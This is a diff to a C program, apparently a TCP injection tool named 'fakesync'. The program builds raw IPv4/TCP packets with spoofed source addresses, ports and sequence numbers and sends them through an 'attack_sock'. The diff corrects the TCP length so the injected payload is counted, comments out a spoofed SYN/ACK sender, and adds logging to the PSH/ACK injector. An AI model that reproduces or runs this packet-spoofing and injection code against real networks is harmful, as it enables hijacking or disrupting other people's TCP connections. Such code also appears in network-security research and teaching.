@@ -121,7 +121,7 @@ int main(int argc, char *argv[]) {
     data = (char *) (tcph + 1);
     strcpy(data, PAYLOAD);
 
-    tcp_len = sizeof(struct tcphdr);
+    tcp_len = sizeof(struct tcphdr) + strlen(data);
 
     iph -> version = 4; // IPv4
     iph -> ihl = 5; // 5 * 32 bits
@@ -233,53 +233,53 @@ uint16_t ip_checksum(void* vdata,size_t length) {
     return htons(~acc);
 }
 
-void send_synack(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
-    const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
-{
-    int num;
-    struct sockaddr_in sa;
+// void send_synack(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
+//     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
+// {
+//     int num;
+//     struct sockaddr_in sa;
 
-    size_t tcp_len = sizeof(struct tcphdr);
-    struct iphdr *iph = (struct iphdr *) datagram;
-    struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
-    struct pshdr *psh = (struct pshdr *) pseudo_packet;
-    struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);
+//     size_t tcp_len = sizeof(struct tcphdr);
+//     struct iphdr *iph = (struct iphdr *) datagram;
+//     struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
+//     struct pshdr *psh = (struct pshdr *) pseudo_packet;
+//     struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);
 
-    // dynamic TCP fields
-    tcph -> syn = 1;
-    cstcph -> syn = 1;
-    tcph -> source = sport; // source port
-    cstcph -> source = sport;
-    tcph -> dest = dport; // destination port
-    cstcph -> dest = dport;
-    tcph -> seq = htonl(seq0); // sequence number
-    cstcph -> seq = htonl(seq0);
-    tcph -> ack_seq = htonl(ack0); // ack sequence number
-    cstcph -> ack_seq = htonl(ack0);
+//     // dynamic TCP fields
+//     tcph -> syn = 1;
+//     cstcph -> syn = 1;
+//     tcph -> source = sport; // source port
+//     cstcph -> source = sport;
+//     tcph -> dest = dport; // destination port
+//     cstcph -> dest = dport;
+//     tcph -> seq = htonl(seq0); // sequence number
+//     cstcph -> seq = htonl(seq0);
+//     tcph -> ack_seq = htonl(ack0); // ack sequence number
+//     cstcph -> ack_seq = htonl(ack0);
 
-    // dynamic pseudo fields
-    psh -> src_addr = saddr;
-    psh -> dst_addr = daddr;
+//     // dynamic pseudo fields
+//     psh -> src_addr = saddr;
+//     psh -> dst_addr = daddr;
 
-    tcph -> check = 0;
-    cstcph -> check = 0;
+//     tcph -> check = 0;
+//     cstcph -> check = 0;
 
-    // calculate check sum
-    tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
+//     // calculate check sum
+//     tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
 
-    // dynamic IP fields
-    iph -> saddr = saddr;
-    iph -> daddr = daddr;
+//     // dynamic IP fields
+//     iph -> saddr = saddr;
+//     iph -> daddr = daddr;
 
-    // dynamic sockaddr field
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = daddr;
+//     // dynamic sockaddr field
+//     sa.sin_family = AF_INET;
+//     sa.sin_addr.s_addr = daddr;
 
-    if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-    {
-        perror("fakesync: sendto()\n");
-    }
-}
+//     if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+//     {
+//         perror("fakesync: sendto()\n");
+//     }
+// }
 
 void send_pshack(const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
@@ -327,6 +327,7 @@ void send_pshack(const int attack_sock, const char *datagram, const char *pseudo
     {
         perror("fakesync: sendto()\n");
     }
+    fprintf(logfile, "DEBUG PSH ACK sent from service %u\n", ntohs(sport));
 }
 
 void print_ip_header(unsigned char* Buffer, int Size)
